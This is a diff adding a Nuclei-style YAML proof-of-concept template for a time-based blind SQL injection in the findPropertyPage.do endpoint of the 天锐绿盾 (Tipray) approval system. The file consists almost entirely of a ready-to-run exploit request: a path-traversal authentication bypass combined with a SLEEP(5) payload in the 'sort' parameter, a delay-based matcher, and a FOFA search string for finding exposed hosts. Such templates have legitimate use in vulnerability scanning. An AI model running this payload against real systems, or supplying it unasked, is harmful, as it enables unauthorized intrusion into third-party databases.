@@ -1,0 +1,29 @@
+id: poc-8350980255
+info:
+  name: 天锐绿盾审批系统 findPropertyPage.do 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: body="location.href=location.href+\"trwfe\";"||body="天锐绿盾"
+http:
+- raw:
+  - 'POST /trwfe/login.jsp/.%2e/invoker/findPropertyPage.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    tenantId=1&categoryId=1&sort=id%20OR%20(SELECT+1337+FROM+(SELECT(SLEEP(5)))test)&order=asc'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
